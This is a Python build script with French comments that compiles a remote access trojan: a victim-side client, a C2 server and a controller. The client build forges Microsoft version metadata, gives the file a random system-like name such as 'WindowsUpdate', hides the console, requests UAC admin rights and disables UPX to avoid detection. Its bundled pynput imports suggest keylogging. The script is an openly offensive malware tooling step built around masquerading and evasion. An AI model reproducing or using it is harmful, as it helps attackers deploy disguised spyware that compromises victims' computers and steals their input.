import PyInstaller.__main__
import os
import platform
import random
import string


def generate_random_name():
    """Génère un nom aléatoire pour le fichier"""
    prefixes = ['System', 'Windows', 'Microsoft', 'Service', 'Update', 'Security']
    suffixes = ['Manager', 'Service', 'Host', 'Update', 'Helper', 'Handler']
    return f"{random.choice(prefixes)}{random.choice(suffixes)}"


def create_version_file():
    """Crée un fichier de version pour Windows"""
    version_info = """
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(10, 0, 19041, 1),
    prodvers=(10, 0, 19041, 1),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'Microsoft Corporation'),
        StringStruct(u'FileDescription', u'Windows Update Service'),
        StringStruct(u'FileVersion', u'10.0.19041.1'),
        StringStruct(u'InternalName', u'WindowsUpdate'),
        StringStruct(u'LegalCopyright', u'(C) Microsoft Corporation. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'WindowsUpdate.exe'),
        StringStruct(u'ProductName', u'Microsoft Windows Operating System'),
        StringStruct(u'ProductVersion', u'10.0.19041.1')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
"""
    with open("version_info.txt", "w", encoding='utf-8') as f:
        f.write(version_info)
    return "version_info.txt"


def compile_client():
    """Compile le client RAT en executable"""
    system = platform.system()

    if system == "Windows":
        version_file = create_version_file()
        output_name = generate_random_name()
        
        PyInstaller.__main__.run([
            "client.py",
            "--onefile",
            "--noconsole",
            f"--name={output_name}",
            "--clean",
            f"--version-file={version_file}",
            "--uac-admin",
            "--disable-windowed-traceback",
            "--optimize=2",
            "--strip",
            "--noupx",  # Désactiver UPX car souvent détecté
            "--hidden-import=pynput.keyboard._win32",
            "--hidden-import=pynput.mouse._win32",
            "--hidden-import=logger",
            "--add-data=config.py;.",
        ])
        print(f"[+] Client Windows compilé: dist/{output_name}.exe")
        
        # Nettoyer le fichier de version
        if os.path.exists(version_file):
            os.remove(version_file)

    else:
        output_name = "system-update-manager"
        PyInstaller.__main__.run([
            "client.py",
            "--onefile",
            f"--name={output_name}",
            "--clean",
            "--optimize=2",
            "--strip",
            "--noupx",
        ])
        print(f"[+] Client Linux compilé: dist/{output_name}")


def compile_server():
    """Compile le serveur C2 en executable"""
    PyInstaller.__main__.run([
        "server.py",
        "--onefile",
        "--name=C2Server",
        "--clean"
    ])
    print("[+] Serveur C2 compilé: dist/C2Server")


def compile_controller():
    """Compile le controller en executable"""
    PyInstaller.__main__.run([
        "controller.py",
        "--onefile",
        "--name=Controller",
        "--clean"
    ])
    print("[+] Controller compilé: dist/Controller")


if __name__ == "__main__":
    import sys
    
    print("\n" + "="*50)
    print("COMPILATEUR RAT - Basic RAT Merged")
    print("="*50)
    print("\n1. Compiler Client (target)")
    print("2. Compiler Server (C2)")
    print("3. Compiler Controller (admin)")
    print("4. Compiler tout")
    print("5. Quitter")
    
    choice = input("\nChoisissez une option (1-5): ").strip()
    
    if choice == "1":
        compile_client()
    elif choice == "2":
        compile_server()
    elif choice == "3":
        compile_controller()
    elif choice == "4":
        print("\n[+] Compilation de tous les composants...")
        compile_client()
        compile_server()
        compile_controller()
        print("\n[+] ✅ Compilation terminée!")
    elif choice == "5":
        print("[+] Au revoir!")
        sys.exit(0)
    else:
        print("[-] Option invalide!")
